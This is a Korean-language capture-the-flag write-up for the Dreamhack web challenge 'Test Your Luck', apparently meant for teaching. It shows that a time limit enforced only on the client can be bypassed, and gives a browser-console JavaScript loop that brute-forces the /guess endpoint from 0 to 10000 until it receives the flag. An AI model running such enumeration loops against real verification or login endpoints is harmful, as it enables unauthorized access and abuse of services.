---
ctf_name: "Dreamhack"
challenge_name: "Test Your Luck"
category: "web"
difficulty: "easy"
author: "sihyunkimm"
date: "2026-08-11"
points: 14
tags: ["Brute Force", "Client-Side Validation Bypass"]
---

# Test Your Luck

## 문제 설명

정답을 추측해 서버에 제출하고, 올바른 값을 맞히면 플래그를 획득하는 문제다. 웹 페이지에서는 정답을 시도할 수 있는 시간이 10초로 제한되어 있다.

## 풀이

### 분석

웹 페이지의 `index.html`에는 10초의 시간 제한이 구현되어 있지만, 이는 클라이언트 측에만 존재하는 제한이다. 서버의 `/guess` 엔드포인트에는 동일한 시간 제한이 적용되지 않으므로 브라우저 콘솔에서 직접 요청하면 10초가 지나도 계속 정답을 제출할 수 있다.

정답의 범위는 `0`부터 `10000`까지이므로, 가능한 값을 차례로 모두 요청하는 브루트 포스로 정답을 찾을 수 있다.

### 취약점

시간 제한을 클라이언트 측 코드에만 의존하고 서버에서 검증하지 않는다. 또한 `/guess` 엔드포인트에 요청 횟수 제한이 없어 공격자가 모든 후보를 자동으로 대입할 수 있다.

### 익스플로잇

브라우저 개발자 도구의 콘솔에서 다음 JavaScript를 실행한다. `0`부터 `10000`까지 값을 하나씩 `/guess`에 전송하고, 응답의 `result`가 `Correct`이면 정답과 플래그를 출력한 뒤 반복을 중단한다.

```javascript
(async () => {
    for (let guess = 0; guess <= 10000; guess++) {
        try {
            const response = await fetch('/guess', {
                method: 'POST',
                body: new URLSearchParams({
                    guess: String(guess)
                })
            });

            const result = await response.json();

            console.log(`진행: ${guess}/10000`);

            if (result.result === 'Correct') {
                console.log('정답:', guess);
                console.log('flag:', result.flag);
                break;
            }
        } catch (e) {
            console.error('오류:', guess, e);
        }
    }

    console.log('종료');
})();
```

페이지에 구현된 10초 제한과 무관하게 요청이 계속 전송되며, 올바른 값을 찾으면 응답에 포함된 플래그를 확인할 수 있다.

## 플래그

```text
DH{REDACTED}
```

## 배운 점

- 클라이언트 측 제한은 개발자 도구나 직접 작성한 요청으로 우회할 수 있으므로 서버에서도 반드시 검증해야 한다.
